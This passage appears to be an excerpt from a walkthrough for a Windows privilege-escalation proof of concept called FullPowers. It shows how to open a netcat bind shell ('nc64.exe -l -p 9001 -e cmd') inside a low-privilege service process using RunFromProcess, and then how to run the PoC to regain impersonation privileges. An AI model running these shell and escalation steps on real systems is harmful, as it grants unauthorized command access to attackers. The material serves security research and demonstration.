...
You'll need 2 third-party tools, netcat and RunFromProcess.
Pick a service which has limited privileges, e.g.: upnphost.
Open the Task Manager, go to the Services tab and get the PID of the corresponding process.
Use the following command to start the bindshell as an administrator:
C:\TOOLS>RunFromProcess-x64.exe <PID> C:\TOOLS\nc64.exe -l -p 9001 -e cmd
Use the following command to connect to the bindshell:
...
We can see that the current process has no impersonation privileges. Now run the PoC...
c:\TOOLS>FullPowers
